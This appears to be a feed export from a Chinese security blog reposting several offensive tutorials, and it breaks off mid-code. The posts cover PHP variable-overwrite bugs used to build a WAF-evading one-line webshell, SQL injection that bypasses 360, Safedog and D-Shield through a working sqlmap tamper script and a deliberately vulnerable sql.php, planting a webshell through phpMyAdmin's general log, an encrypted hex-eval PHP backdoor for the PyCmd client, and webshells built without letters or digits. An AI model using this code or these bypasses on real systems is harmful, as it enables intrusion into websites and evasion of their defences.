alt=""><br>在开头我们定义了一个数组d<br>然后我们使用extract()函数并将array参数填写为数组d<br>此时数组d中的键名将当做新的变量名来创建一个新的变量，而新的变量的值即为在数组中对应的值。（注意如果之前有声明过同一个变量,那么该变量将被覆盖。如果之后才声明将不会出现变量覆盖的现象）<br>此时输出结果为：<br> <img src="https://i.loli.net/2018/07/09/5b426fdadac1e.png" alt=""><br>可以看到我们之前并未声明过a、b、c变量，但是仍可输出。</p><h3 id="3-parse-str-定义："><a href="#3-parse-str-定义：" class="headerlink" title="3.parse_str()定义："></a>3.parse_str()定义：</h3><p>把查询字符串解析到变量中<br>语法：parse_str(string,array)<br>string为必选参数<br>array为可选参数<br>举个例子<br> <img src="https://i.loli.net/2018/07/09/5b426fdae279d.png" alt=""><br>可以看到此函数将name和age初始化成了变量，且值为等号右边的值<br>当array参数存在时：<br> <img src="https://i.loli.net/2018/07/09/5b426fdae96e7.png" alt=""><br>4.import_request_varibles()定义<br>将 GET/POST/Cookie 变量导入到全局作用域中<br>此函数相当于开启全局变量注册<br>语法import_request_variables(string $types ,string $prefix )<br>第一个参数为必选<br>第二个参数为可选<br>例子：<br>import_request_variables(“GPC”)<br>使用此方法即可开启对_POST、_GET、_COOKIE的全局变量注册<br>当第二个参数存在时将会加上一个前缀</p><h2 id="三、经典案例"><a href="#三、经典案例" class="headerlink" title="三、经典案例"></a>三、经典案例</h2><h3 id="1-经典-变量覆盖"><a href="#1-经典-变量覆盖" class="headerlink" title="1.经典$$变量覆盖"></a>1.经典$$变量覆盖</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foreach(array(&apos;_COOKIE&apos;,&apos;_POST&apos;,&apos;_GET&apos;) as $_request) &#123;</span><br><span class="line">    foreach($$_request as $_key =&gt; $_value) &#123;</span><br><span class="line">        $$_key = addslashes($_value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这是一段非常经典的$$注册变量导致的变量覆盖代码，很多应用上都出现过<br>可以看出$_key为COOKIE POST GET中的参数<br>比如提交?a=1 则$_key的值为a<br>而下面的$$_key则会有$a的意思，结合起来就变成了$a = addslashes($_value)<br>这样便会覆盖原有的变量a的值<br>我们来运行一下：<br> <img src="https://i.loli.net/2018/07/09/5b426fdb04b50.png" alt=""><br>可以看到变量a被我们覆盖掉了</p><h3 id="2-部分cms变量覆盖案例："><a href="#2-部分cms变量覆盖案例：" class="headerlink" title="2.部分cms变量覆盖案例："></a>2.部分cms变量覆盖案例：</h3><p>MetInfo全局变量覆盖另类突破防注入<br><a href="http://www.weixianmanbu.com/article/84.html" target="_blank" rel="noopener">http://www.weixianmanbu.com/article/84.html</a><br>齐博CMS变量覆盖导致sql注入漏洞<br><a href="http://bobao.360.cn/learning/detail/291.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/291.html</a><br>Destoon 20140530最新版超全局变量覆盖导致的安全问题<br><a href="http://0day5.com/archives/1855/" target="_blank" rel="noopener">http://0day5.com/archives/1855/</a></p><h2 id="四、变量覆盖玩出新花样之一句话木马bypass某狗"><a href="#四、变量覆盖玩出新花样之一句话木马bypass某狗" class="headerlink" title="四、变量覆盖玩出新花样之一句话木马bypass某狗"></a>四、变量覆盖玩出新花样之一句话木马bypass某狗</h2><p>经过我们简单的测试，我们可以了解到：当我们使用assert函数时，如果函数的参数是可控，那么某狗拦截。例如:assert($_POST[a])或者$a=$_POST[c];assert($a)这些都是拦截<br> <img src="https://i.loli.net/2018/07/09/5b426fdb03b70.png" alt=""></p><p>但是如果我们只有assert($a)这一句时，我们发现他就不会进行拦截了<br> <img src="https://i.loli.net/2018/07/09/5b426fdb03bfc.png" alt=""><br>这就值得我们思考了，为什么这样不会拦截呢？<br>我认为应该是某狗觉得这个变量a是不可控的，所以就认为这不是木马<br>那如果这时我们在联系一下变量覆盖漏洞呢？<br>在这里我选用了上面的案例代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">foreach(array(&apos;_COOKIE&apos;,&apos;_POST&apos;,&apos;_GET&apos;) as $_request) &#123;</span><br><span class="line">    foreach($$_request as $_key =&gt; $_value) &#123;</span><br><span class="line">        $$_key = addslashes($_value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>把addslashes()删掉 然后把代码精简下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foreach(array(&apos;_POST&apos;) as $_r)&#123;foreach($$_r as $_k =&gt; $_v) &#123;$$_k = $_v;&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>最终代码为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php foreach(array(&apos;_POST&apos;) as $_r)&#123;foreach($$_r as $_k =&gt; $_v) &#123;$$_k = $_v;&#125;&#125;;assert($a);?&gt;</span><br></pre></td></tr></table></figure></p><p>成功bypass<br> <img src="https://i.loli.net/2018/07/09/5b426fdb06bb0.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;一、发生条件：&quot;&gt;&lt;a href=&quot;#一、发生条件：&quot; class=&quot;headerlink&quot; title=&quot;一、发生条件：&quot;&gt;&lt;/a&gt;一、发生条件：&lt;/h2&gt;&lt;p&gt;函数使用不当（$$、extract()、parse_str()、import_request_variables()等）&lt;br&gt;开启全局变量&lt;/p&gt;
&lt;h2 id=&quot;二、基础了解：&quot;&gt;&lt;a href=&quot;#二、基础了解：&quot; class=&quot;headerlink&quot; title=&quot;二、基础了解：&quot;&gt;&lt;/a&gt;二、基础了解：&lt;/h2&gt;&lt;h3 id=&quot;1-定义&quot;&gt;&lt;a href=&quot;#1-定义&quot; class=&quot;headerlink&quot; title=&quot;1.$$定义&quot;&gt;&lt;/a&gt;1.$$定义&lt;/h3&gt;&lt;p&gt;$$代表可变变量，就是说，一个变量的变量名可以动态的设置和使用。&lt;br&gt;
    
    </summary>
    
      <category term="原创栏目" scheme="http://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
    
      <category term="奇淫技巧" scheme="http://www.0x002.com/tags/%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/"/>
    
      <category term="过狗" scheme="http://www.0x002.com/tags/%E8%BF%87%E7%8B%97/"/>
    
  </entry>
  
  <entry>
    <title>[转]绕过360,安全狗,D盾等进行Sql注入</title>
    <link href="http://www.0x002.com/2017/%5B%E8%BD%AC%5D%E7%BB%95%E8%BF%87360,%E5%AE%89%E5%85%A8%E7%8B%97,D%E7%9B%BE%E7%AD%89%E8%BF%9B%E8%A1%8CSql%E6%B3%A8%E5%85%A5/"/>
    <id>http://www.0x002.com/2017/[转]绕过360,安全狗,D盾等进行Sql注入/</id>
    <published>2017-08-24T16:07:39.000Z</published>
    <updated>2018-07-09T20:27:36.525Z</updated>
    
    <content type="html"><![CDATA[<h4 id="作者-Bypass"><a href="#作者-Bypass" class="headerlink" title="作者:Bypass"></a>作者:Bypass</h4><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>在测试过程中，经常会遇到一些主机防护软件，对这方面做了一些尝试，可成功bypass了GET和POST的注入防御，分享一下姿势。</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a><strong>0x02 环境搭建</strong></h2><p>Windows Server 2003+phpStudy</p><p><img src="https://i.loli.net/2018/07/10/5b43c36bcac0f.png" alt=""></p><p>sql注入点测试代码：<br><a id="more"></a><br>sql.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">if (!$con)</span><br><span class="line">  &#123;</span><br><span class="line">  die(&apos;Could not connect: &apos; . mysql_error());</span><br><span class="line">  &#125;</span><br><span class="line">mysql_select_db(&quot;test&quot;, $con);</span><br><span class="line">$id = $_REQUEST[ &apos;id&apos; ];</span><br><span class="line">$query  = &quot;SELECT * FROM admin WHERE username = $id &quot;;</span><br><span class="line">$result = mysql_query($query);</span><br><span class="line">while($row = mysql_fetch_array($result))</span><br><span class="line">  &#123;</span><br><span class="line">  echo $row[&apos;0&apos;] . &quot; &quot; . $row[&apos;1&apos;];</span><br><span class="line">  echo &quot;&amp;lt;br /&amp;gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">echo &quot;&amp;lt;br/&amp;gt;&quot;;</span><br><span class="line">echo $query;</span><br><span class="line">mysql_close($con);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>运行效果：</p><p><img src="https://i.loli.net/2018/07/10/5b43c38abbd51.png" alt=""></p><h2 id="0x03-Bypass-过程"><a href="#0x03-Bypass-过程" class="headerlink" title="0x03 Bypass 过程"></a><strong>0x03 Bypass 过程</strong></h2><p>对不同waf做了一些尝试，关于SQL注入bypass，可以考虑划分为3种：</p><p>1、完全bypass（union select+select from）</p><p>2、部分bypass（union select 或select from）</p><p>3、获取一些敏感信息（如version()、database()等）</p><p><strong>A、Union+select</strong></p><p>先考虑如何绕过union+select，可以考虑一下几种形式</p><p>1、最常见形式 %20、+、/**/</p><p>2、Mysql中可以利用的空白字符有：%09,%0a,%0b,%0c,%0d,%20,%a0</p><p>3、内联注释   /!12345select/</p><p>通过组合测试，可以发现 union%0a/<em>!12345select</em>/ 1,2 可以绕过防御。</p><p><img src="https://i.loli.net/2018/07/10/5b43c3c49a497.png" alt=""></p><p>B、<strong>select+from</strong></p><p><strong>　　</strong>select+from 也可以通过同样的组合形式绕过防御。</p><p>至此已完全绕过union+select+from。</p><p><img src="https://i.loli.net/2018/07/10/5b43c3eccea2c.png" alt=""></p><h2 id="0x04-自动化注入"><a href="#0x04-自动化注入" class="headerlink" title="0x04 自动化注入"></a><strong>0x04 自动化注入</strong></h2><p>编写tamper bypass脚本，来利用sqlmap来跑数据</p><p>先看一下原始sqlmap的效果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u  http://192.168.106.130/config/sql.php?id=1  --flush-session --dbs   失败</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/07/10/5b43c4069255b.png" alt=""></p><p>加载tamper脚本，可成功获取数据。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http://192.168.106.130/config/sql.php?id=1 --flush-session  --technique=U --tamper=&quot;360safe.py&quot; --dbs</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/07/10/5b43c4214f10f.png" alt=""></p><p>tamper脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">write by Aaron</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">from lib.core.settings import UNICODE_ENCODING</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces keywords</span><br><span class="line">    &amp;gt;&amp;gt;&amp;gt; tamper(&apos;UNION SELECT id FROM users&apos;)</span><br><span class="line">    &apos;union%0a/*!12345select*/id%0a/*!12345from*/users&apos;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if payload:</span><br><span class="line">        payload=payload.replace(&quot; ALL SELECT &quot;,&quot;%0a/*!12345select*/&quot;)</span><br><span class="line">        payload=payload.replace(&quot;UNION SELECT&quot;,&quot;union%0a/*!12345select*/&quot;)</span><br><span class="line">        payload=payload.replace(&quot; FROM &quot;,&quot;%0a/*!12345from*/&quot;)</span><br><span class="line">        payload=payload.replace(&quot;CONCAT&quot;,&quot;CONCAT%23%0a&quot;)</span><br><span class="line">        payload=payload.replace(&quot;CASE &quot;,&quot;CASE%23%0a&quot;)</span><br><span class="line">        payload=payload.replace(&quot;CAST(&quot;,&quot;/*!12345CASt(*/&quot;)</span><br><span class="line">        payload=payload.replace(&quot;DATABASE()&quot;,&quot;database%0a()&quot;)</span><br><span class="line"></span><br><span class="line">    return payload&lt;/pre&gt;</span><br><span class="line">&lt;div class=&quot;cnblogs_code_toolbar&quot;&gt;&lt;span class=&quot;cnblogs_code_copy&quot;&gt;&lt;a title=&quot;复制代码&quot;&gt;&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p><p>这边主要是针对union select查询进行的关键字替换，测试过程中，可以发现利用tamper脚本来bypass的弊端，sqlmap的部分payload是固定的，部分关键字会被waf拦截，需要一步步调试，总结，测试哪些关键字是被拦截的，如何绕过关键字的检测等，还是挺麻烦。</p><h2 id="0x05-END"><a href="#0x05-END" class="headerlink" title="0x05 END"></a><strong>0x05 END</strong></h2><p>最好的自动化注入工具：可以考虑自己编写一个自动化注入工具，灵活的自定义payload来获取数据库信息。</p><p>目前的测试成果，可成功bypass注入防御，如 安全狗、云锁、360主机卫士、D盾_IIS防火墙等主机防护软件及各种云waf，有些姿势都在用。</p><p>原文链接：<a href="https://www.cnblogs.com/xiaozi/p/7275134.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/7275134.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;作者-Bypass&quot;&gt;&lt;a href=&quot;#作者-Bypass&quot; class=&quot;headerlink&quot; title=&quot;作者:Bypass&quot;&gt;&lt;/a&gt;作者:Bypass&lt;/h4&gt;&lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;在测试过程中，经常会遇到一些主机防护软件，对这方面做了一些尝试，可成功bypass了GET和POST的注入防御，分享一下姿势。&lt;/p&gt;
&lt;h2 id=&quot;0x02-环境搭建&quot;&gt;&lt;a href=&quot;#0x02-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;0x02 环境搭建&quot;&gt;&lt;/a&gt;&lt;strong&gt;0x02 环境搭建&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;Windows Server 2003+phpStudy&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2018/07/10/5b43c36bcac0f.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;sql注入点测试代码：&lt;br&gt;
    
    </summary>
    
      <category term="技术文章" scheme="http://www.0x002.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="奇淫技巧" scheme="http://www.0x002.com/tags/%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/"/>
    
      <category term="D盾" scheme="http://www.0x002.com/tags/D%E7%9B%BE/"/>
    
      <category term="过狗" scheme="http://www.0x002.com/tags/%E8%BF%87%E7%8B%97/"/>
    
      <category term="SQL注入" scheme="http://www.0x002.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>[转]phpmyadmin日志拿shell</title>
    <link href="http://www.0x002.com/2017/%5B%E8%BD%AC%5Dphpmyadmin%E6%97%A5%E5%BF%97%E6%8B%BFshell/"/>
    <id>http://www.0x002.com/2017/[转]phpmyadmin日志拿shell/</id>
    <published>2017-08-24T08:42:15.000Z</published>
    <updated>2018-07-09T20:27:26.188Z</updated>
    
    <content type="html"><![CDATA[<h4 id="作者：珍惜少年时"><a href="#作者：珍惜少年时" class="headerlink" title="作者：珍惜少年时"></a>作者：珍惜少年时</h4><h2 id="前提：条件是root用户。"><a href="#前提：条件是root用户。" class="headerlink" title="前提：条件是root用户。"></a><strong>前提：</strong>条件是root用户。</h2><p>思路：就是利用mysql的一个日志文件。这个日志文件每执行一个sql语句就会将其执行的保存。我们将这个日志文件重命名为我们的shell.php然后执行一条sql带一句话木马的命令。然后执行菜刀连接之！</p><p>要先把general log设置为ON<br><a id="more"></a><br><img src="https://i.loli.net/2018/07/10/5b43c4bac2fe0.png" alt=""></p><p>然后将文件修改日志文件名修改。</p><p><img src="https://i.loli.net/2018/07/10/5b43c4d204d5d.png" alt=""></p><p>本来是在mysql下的一个log日志文件的，我重新改到了phpstudy目录下然后命名为def2.php</p><p>然后随便执行一条sql语句。</p><p><img src="https://i.loli.net/2018/07/10/5b43c4ed0b163.png" alt=""></p><p>菜刀连接之。</p><p><img src="https://i.loli.net/2018/07/10/5b43c506286db.png" alt=""></p><p>原文链接：<a href="https://www.cnblogs.com/xishaonian/p/6622818.html" target="_blank" rel="noopener">https://www.cnblogs.com/xishaonian/p/6622818.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;作者：珍惜少年时&quot;&gt;&lt;a href=&quot;#作者：珍惜少年时&quot; class=&quot;headerlink&quot; title=&quot;作者：珍惜少年时&quot;&gt;&lt;/a&gt;作者：珍惜少年时&lt;/h4&gt;&lt;h2 id=&quot;前提：条件是root用户。&quot;&gt;&lt;a href=&quot;#前提：条件是root用户。&quot; class=&quot;headerlink&quot; title=&quot;前提：条件是root用户。&quot;&gt;&lt;/a&gt;&lt;strong&gt;前提：&lt;/strong&gt;条件是root用户。&lt;/h2&gt;&lt;p&gt;思路：就是利用mysql的一个日志文件。这个日志文件每执行一个sql语句就会将其执行的保存。我们将这个日志文件重命名为我们的shell.php然后执行一条sql带一句话木马的命令。然后执行菜刀连接之！&lt;/p&gt;
&lt;p&gt;要先把general log设置为ON&lt;br&gt;
    
    </summary>
    
      <category term="技术文章" scheme="http://www.0x002.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="phpmyadmin" scheme="http://www.0x002.com/tags/phpmyadmin/"/>
    
      <category term="奇淫技巧" scheme="http://www.0x002.com/tags/%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>[转]利用PyCmd加密隐形木马，成功绕过D盾</title>
    <link href="http://www.0x002.com/2017/%5B%E8%BD%AC%5D%E5%88%A9%E7%94%A8PyCmd%E5%8A%A0%E5%AF%86%E9%9A%90%E5%BD%A2%E6%9C%A8%E9%A9%AC%EF%BC%8C%E6%88%90%E5%8A%9F%E7%BB%95%E8%BF%87D%E7%9B%BE/"/>
    <id>http://www.0x002.com/2017/[转]利用PyCmd加密隐形木马，成功绕过D盾/</id>
    <published>2017-08-20T09:05:14.000Z</published>
    <updated>2018-07-09T20:33:30.108Z</updated>
    
    <content type="html"><![CDATA[<h4 id="作者：nmask"><a href="#作者：nmask" class="headerlink" title="作者：nmask"></a>作者：nmask</h4><hr><p><strong>之前写了一个基于python的一句话木马客户端程序，这个程序的作用大致就是为了绕过防护设备，使敏感数据能在网络里自由穿梭。由于编程能力有限，当时以python程序作为客户端，php代码作为服务端，勉强能用，但是缺乏jsp的服务端，使之功能很局限。幸好有大神<a href="http://www.kongdewei.cn/" target="_blank" rel="noopener">caomei</a>相助，帮助实现了jsp端的代码，故将两者相结合，方便使用。</strong></p><h2 id="PyCmd适用环境"><a href="#PyCmd适用环境" class="headerlink" title="PyCmd适用环境"></a>PyCmd适用环境</h2><p>当服务器允许上传任意文件，且对文件内容不进行审计检查，但由于其网络边界有防火墙会拦截审计通信的数据。这时我们能成功上传一句话木马，然而连接菜刀的时候会出现500错误，此时可以使用pycmd工具，因为其会对互相通信的内容加密处理。<br><a id="more"></a></p><h2 id="PyCmd使用"><a href="#PyCmd使用" class="headerlink" title="PyCmd使用"></a>PyCmd使用</h2><p>我这里准备了2个靶机，分别装有php与jsp的运行环境，用来模拟真实的网站服务器。</p><p>为了方便，我已经把服务端木马程序放到了服务器网站目录下：</p><p>php网站木马地址：10.0.3.13/test/p.php</p><p>jsp网站木马地址：192.168.10.149:8080/headgmp/upload/2017_07_13/11.jsp</p><p>查看shell的情况：</p><p><a href="http://image.3001.net/images/20170714/15000049747112.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20170714/15000049747112.png!small" alt="浅析PyCmd加密隐形木马"></a></p><p>此时，运行PyCmd.py程序：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python PyCmd.py -u http://10.0.3.13/test/p.php -p test [--proxy]</span><br></pre></td></tr></table></figure></p><p>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python PyCmd.py -u http://192.168.10.149:8080/headgmp/upload/2017_07_13/11.jsp -p test [--proxy]</span><br></pre></td></tr></table></figure></p><p><img src="http://image.3001.net/images/20170714/15000049277207.png" alt="浅析PyCmd加密隐形木马"></p><p>程序会自动判断输入的网站类型，这里是jsp类型的网站。</p><p>运行程序可输入以下参数：</p><blockquote><p>-h 查看帮助信息</p><p>-u 网站木马地址</p><p>-p 木马shell密码</p><p>–proxy 开启本地代理（方便调试）<br>注：当开启本地调试，需运行Fiddler程序，或者其他抓包软件。</p></blockquote><h2 id="PyCmd数据加密"><a href="#PyCmd数据加密" class="headerlink" title="PyCmd数据加密"></a>PyCmd数据加密</h2><p>PyCmd程序的长处在于它对往来的数据进行了加密，可以绕过防火墙对数据内容的校验。</p><p>当执行cmd命令时，通过Fiddler抓包查看数据：</p><p><img src="http://image.3001.net/images/20170717/15002739431723.png" alt="浅析PyCmd加密隐形木马"></p><p>查看回报信息：</p><p><img src="http://image.3001.net/images/20170717/15002739773897.png" alt="浅析PyCmd加密隐形木马"></p><h2 id="PyCmd木马隐身"><a href="#PyCmd木马隐身" class="headerlink" title="PyCmd木马隐身"></a>PyCmd木马隐身</h2><p>用D盾扫描上传的木马服务端文件，显示为正常文件，成功躲过查杀（2016.9.18日检测结果）</p><p>这里演示php木马查杀：</p><blockquote><p>&lt;?php</p><p>$string=”;</p><p>$password=’test’;</p><p>if(isset($_POST[$password])){</p><p>$hex=$_POST[$password];</p><p>for($i=0;$i&lt;strlen($hex)-1;$i+=2){</p><p>$string.=chr(hexdec($hex[$i].$hex[$i+1]));</p><p>}</p><p>@eval($string);</p><p>}else{</p><p>echo “This is a Test!”;</p><p>}</p><p>?&gt;</p></blockquote><h3 id=""><a href="#" class="headerlink" title=""></a><a href="http://image.3001.net/images/20170717/15002740265116.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20170717/15002740265116.png!small" alt="PyCmd 加密隐形木马"></a></h3><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>PyCmd <a href="https://github.com/tengzhangchao/PyCmd" target="_blank" rel="noopener">下载地址</a></p><p>项目地址：<a href="https://github.com/tengzhangchao/PyCmd" target="_blank" rel="noopener">https://github.com/tengzhangchao/PyCmd</a></p><p>说明：绕过防火墙检测的方法很多，这里只是提供了一种思路，pycmd是我去年写的一款工具，最近打算完善其功能，代码已经开源。</p><p>原文连接：<a href="https://thief.one/2016/09/18/PyCmd-%E5%8A%A0%E5%AF%86%E9%9A%90%E5%BD%A2%E6%9C%A8%E9%A9%AC/" target="_blank" rel="noopener">https://thief.one/2016/09/18/PyCmd-%E5%8A%A0%E5%AF%86%E9%9A%90%E5%BD%A2%E6%9C%A8%E9%A9%AC/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;作者：nmask&quot;&gt;&lt;a href=&quot;#作者：nmask&quot; class=&quot;headerlink&quot; title=&quot;作者：nmask&quot;&gt;&lt;/a&gt;作者：nmask&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;之前写了一个基于python的一句话木马客户端程序，这个程序的作用大致就是为了绕过防护设备，使敏感数据能在网络里自由穿梭。由于编程能力有限，当时以python程序作为客户端，php代码作为服务端，勉强能用，但是缺乏jsp的服务端，使之功能很局限。幸好有大神&lt;a href=&quot;http://www.kongdewei.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;caomei&lt;/a&gt;相助，帮助实现了jsp端的代码，故将两者相结合，方便使用。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;PyCmd适用环境&quot;&gt;&lt;a href=&quot;#PyCmd适用环境&quot; class=&quot;headerlink&quot; title=&quot;PyCmd适用环境&quot;&gt;&lt;/a&gt;PyCmd适用环境&lt;/h2&gt;&lt;p&gt;当服务器允许上传任意文件，且对文件内容不进行审计检查，但由于其网络边界有防火墙会拦截审计通信的数据。这时我们能成功上传一句话木马，然而连接菜刀的时候会出现500错误，此时可以使用pycmd工具，因为其会对互相通信的内容加密处理。&lt;br&gt;
    
    </summary>
    
      <category term="神兵利器" scheme="http://www.0x002.com/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
    
    
      <category term="奇淫技巧" scheme="http://www.0x002.com/tags/%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/"/>
    
      <category term="webshell" scheme="http://www.0x002.com/tags/webshell/"/>
    
      <category term="D盾" scheme="http://www.0x002.com/tags/D%E7%9B%BE/"/>
    
      <category term="过狗" scheme="http://www.0x002.com/tags/%E8%BF%87%E7%8B%97/"/>
    
  </entry>
  
  <entry>
    <title>[转]一些不包含数字和字母的webshell</title>
    <link href="http://www.0x002.com/2017/%5B%E8%BD%AC%5D%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/"/>
    <id>http://www.0x002.com/2017/[转]一些不包含数字和字母的webshell/</id>
    <published>2017-07-27T07:29:14.000Z</published>
    <updated>2018-07-09T20:38:26.228Z</updated>
    
    <content type="html"><![CDATA[<h4 id="作者：离别歌"><a href="#作者：离别歌" class="headerlink" title="作者：离别歌"></a>作者：离别歌</h4><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>在小密圈提了个问题，“如何编写一个不使用数字和字母的webshell”，并具体成如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!preg_match(&apos;/[a-z0-9]/is&apos;,$_GET[&apos;shell&apos;])) &#123;</span><br><span class="line">  eval($_GET[&apos;shell&apos;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>那么，这个代码如何利用？<br><a id="more"></a></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a><a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html#_1" target="_blank" rel="noopener">思路</a></h3><p>首先，明确思路。我的核心思路是，将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如“assert”，然后动态执行之即可。</p><p>那么，<strong>变换方法</strong> 将是解决本题的要点。</p><p>不过在此之前，我需要说说php5和7的差异。</p><p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p><p>但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</p><p>下文为了方便起见，使用PHP5作为环境，PHP7相关的利用方法自己探索吧。</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a><a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html#_2" target="_blank" rel="noopener">方法一</a></h3><p>这是最简单、最容易想到的方法。在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p><p>得到如下的结果（因为其中存在很多不可打印字符，所以我用url编码表示了）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$=(&apos;%01&apos;^&apos;&apos;&lt;/span&gt;&lt;span 